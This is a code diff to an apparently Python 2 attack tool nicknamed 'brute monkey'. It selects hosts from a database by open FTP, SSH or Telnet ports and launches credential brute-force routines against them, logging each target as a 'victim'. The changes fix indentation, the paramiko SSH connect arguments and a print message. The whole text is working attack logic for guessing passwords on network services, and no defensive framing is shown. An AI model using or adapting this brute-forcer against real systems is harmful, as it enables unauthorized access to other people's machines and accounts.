@@ -30,8 +30,6 @@ def findLoginBoxes(runTime,dbIp,dbName,monkeyIq,monkeyLoc,monkeyId):
             time.sleep(10)
 
         else:
-            #We have to set an extra boolean so a match will skip the other possible matches
-            # (i.e. don't repeat attacking the same host if other services are running on same host)
             for work in hosts.find({'location':monkeyLoc}):
                 if 21 in work['ports']:
                     targets.append(work['ip'])
@@ -46,23 +44,22 @@ def findLoginBoxes(runTime,dbIp,dbName,monkeyIq,monkeyLoc,monkeyId):
                     ports.append(23)
 
 
-        if len(targets) == 0:
-            print 'Brute monkey is waiting for something to brute force.  Eating bananas.  Will check again in 10 seconds.'
-            time.sleep(10)
+            if len(targets) == 0:
+                print 'Brute monkey is waiting for something to brute force.  Eating bananas.  Will check again in 10 seconds.'
+                time.sleep(10)
 
-        else:
-            print 'Brute monkey got work! Starting credential brute forcing!'
+            else:
+                print 'Brute monkey got work! Starting credential brute forcing!'
+                index = randint(0,len(targets)-1)
 
-            index = randint(0,len(targets)-1)
+                if ports[index] == 21:
+                    ftpBrute(targets[index],db,hosts,monkeyId)
 
-            if ports[index] == 21:
-                ftpBrute(targets[index],db,hosts,monkeyId)
+                elif ports[index] == 22:
+                    sshBrute(targets[index],db,hosts,monkeyId)
 
-            elif ports[index] == 22:
-                sshBrute(targets[index],db,hosts,monkeyId)
-
-            elif ports[index] == 23:
-                telBrute(targets[index],db,hosts,monkeyId)
+                elif ports[index] == 23:
+                    telBrute(targets[index],db,hosts,monkeyId)
 
 def sshBrute(victim,db,coll,monkeyId):
     startTime = time.ctime()
@@ -81,7 +78,7 @@ def sshBrute(victim,db,coll,monkeyId):
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
         try:
-            ssh.connect(target, 22, usr, pwd)
+            ssh.connect(victim, 22, user, pwd)
 
         except paramiko.AuthenticationException:
             pass
@@ -116,7 +113,7 @@ def ftpBrute(victim,db,coll,monkeyId):
             pass
 
     endTime = time.ctime()
-    print 'finished FTP brute forcing of ' + victim + 'at ' + endTime
+    print 'finished FTP brute forcing of ' + victim + ' at ' + endTime
     saveResults('ftpbruteforce',db,coll,victim,21,startTime,endTime,monkeyId)
     return
 
